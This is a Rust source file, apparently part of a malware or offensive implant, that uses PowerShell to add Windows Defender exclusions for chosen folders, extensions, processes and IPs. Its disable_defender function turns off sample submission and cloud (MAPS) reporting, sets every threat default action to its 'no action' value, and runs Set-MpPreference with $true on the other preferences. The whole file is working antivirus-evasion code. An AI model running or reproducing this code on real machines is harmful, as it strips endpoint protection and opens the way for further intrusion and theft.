use std::{process::Command};

use anyhow::Ok;
use powershell_script;
use crate::globals::*;

pub fn add_exclusion_folder(folder: &str) -> anyhow::Result<String> {
    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONFOLDERCOMMAND, folder))?.to_string())
}
pub fn add_exclusion_extention(extention: &str) -> anyhow::Result<String> {
    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONEXTENTIONCOMMAND, extention))?.to_string())
}
pub fn add_exclusion_process(process: &str) -> anyhow::Result<String> {
    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONPROCESSCOMMAND, process))?.to_string())
}
pub fn add_exclusion_ip_address(ip: &str) -> anyhow::Result<String> {
    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONIPADDRESSCOMMAND, ip))?.to_string())
}
pub fn disable_defender() -> anyhow::Result<()>{
    let command = Command::new("powershell.exe").args(vec!["Get-MpPreference", "-verbose"]).output()?;
    let output = String::from_utf8(command.stdout)?;
    let lines = output.lines();
    for line in lines{
        if line.starts_with("SubmitSamplesConsent") && !line.ends_with("2"){
            powershell_script::run(&format!("{}", SUBMITSAMPLESCONSENT))?;
        } else if line.starts_with("MAPSReporting") && !line.ends_with("0") {
            powershell_script::run(&format!("{}", MAPSREPORTING))?;
        } else if line.starts_with("HighThreatDefaultAction") && !line.ends_with("6") {
            powershell_script::run(&format!("{}", HIGHTHREATDEFAULTACTION))?;
        } else if line.starts_with("ModerateThreatDefaultAction") && !line.ends_with("6"){
            powershell_script::run(&format!("{}", MODERATETHREATDEFAULTACTION))?;
        } else if line.starts_with("LowThreatDefaultAction") && !line.ends_with("6") {
            powershell_script::run(&format!("{}", LOWTHREATDEFAULTACTION))?;
        } else if line.starts_with("SevereThreatDefaultAction") && !line.ends_with("6") {
            powershell_script::run(&format!("{}", SEVERETHREATDEFAULTACTION))?;
        }
        else {
            powershell_script::run(&format!("Set-MpPreference -{} $true", line))?;
        }
    }
    Ok(())
}